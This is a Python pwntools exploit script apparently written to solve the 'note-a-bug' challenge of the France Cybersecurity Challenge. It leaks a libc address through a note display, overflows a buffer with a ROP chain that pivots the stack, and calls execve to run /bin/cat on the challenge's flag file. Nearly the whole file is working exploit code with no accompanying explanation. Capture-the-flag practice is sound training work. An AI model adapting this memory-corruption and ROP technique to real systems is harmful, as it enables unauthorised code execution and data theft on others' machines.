from pwn import *
import pwn
import random as rnd
import struct as st
from time import sleep

context.arch = "amd64"
context.word_size = 64

file = "./note-a-bug"
args = ["999"]
io: process = None

speed = 0.2

def debug():
    gdb.attach(io, gdbscript=
    """
    
    """)
    input("debug")

def launch_remote():
    global file, io
    io = remote(host="challenges.france-cybersecurity-challenge.fr", port=2109)

def launch_local():
    global file, io
    io = process([file, *args])
    debug()

u64 = lambda d: pwn.u64(d.ljust(8, b"\0")[:8])
u32 = lambda d: pwn.u32(d.ljust(4, b"\0")[:4])
u16 = lambda d: pwn.u16(d.ljust(2, b"\0")[:2])
sla = lambda a, b: io.sendlineafter(a, b)
sl = lambda a: io.sendline(a)
recv = lambda: io.recv()
recvn = lambda a: io.recvn(a)
recvu = lambda a, b=False: io.recvuntil(a, b)

def launch():
    l = launch_local
    l = launch_remote
    l()

def getb(d, a, b):
    a_ = d.find(a)
    return d[a_+len(a):d.find(b, a_)]

#
# exploit goes here
#

exe = ELF(file)
libc = ELF("./libc.so.6")


def exploit():
    def new_note(size, content):
        io.sendlineafter(b">>> ", b"1")
        leak = io.recvuntil(b"Content ")
        note = getb(leak, b"note: ", b"\n")
        io.sendlineafter(b"length: \n", str(size).encode())
        io.sendlineafter(b"Content: \n", content)
        return note

    def show_note(note):
        io.sendlineafter(b">>> ", b"2")
        io.sendline(SESSION + b"/" + note)
        leak = io.recvuntil(b"Choices:")
        leak = re.findall(rb"\] ((?:[0-9a-f]{2} ?){0,16})", leak)
        return bytes.fromhex(b"".join(leak).decode())

    leak = io.recvuntil(b"Choices:")
    SESSION = getb(leak, b"fcsc/", b"/\n")

    note = new_note(0x100, b"AABC")
    leak = show_note(note)

    libc.address = u64(leak[0xa8:0xb0]) - 0x271ca

    pop_rdi = libc.address + 0x27765
    pop_rsi = libc.address + 0x28f19
    pop_rdx = libc.address + 0xfdcfd
    pop_rsp = libc.address + 0x273ea

    payload = flat([
        b"A"*0x68,

        pop_rdi,
        0,
        pop_rsi,
        0x405000 - 0x800, # rw- memory
        pop_rdx,
        0x800,
        libc.sym["read"],
        pop_rsp,
        0x405000 - 0x800, # rw- memory
    ])
    input("pivot")
    new_note(0x100, payload)
    sleep(speed)

    payload = flat([
        pop_rdi,
        0,
        pop_rsi,
        0x405000 - 0x200, # rw- memory
        pop_rdx,
        0x600,
        libc.sym["read"],

        pop_rdi,
        0,
        pop_rsi,
        0x405000 - 0x100, # rw- memory
        pop_rdx,
        0x600,
        libc.sym["read"],
        
        pop_rdi,
        0x405000 - 0x200, # rw- memory
        pop_rsi,
        0x405000 - 0x100, # rw- memory
        pop_rdx,
        0,
        libc.sym["execve"],
    ])
    sl(payload)
    sleep(speed)

    # got flag file name with a /bin/ls payload
    file = b"/fcsc/ZBrKMnQJGebtYHDXrNxxF6hU2DzwJzX/KCtSfav9uRRHxfjbmjFVE72PgZa5DHn"

    sl(b"/bin/cat\0")
    sleep(speed)
    base = 0x405000 - 0x100
    payload = flat([
        base - 0x100,
        base + 0x18,
        0,
        file + b"\0"
    ])
    sl(payload)
    sleep(speed)

    io.interactive()
    input("end")
    exit()

launch()
exploit()
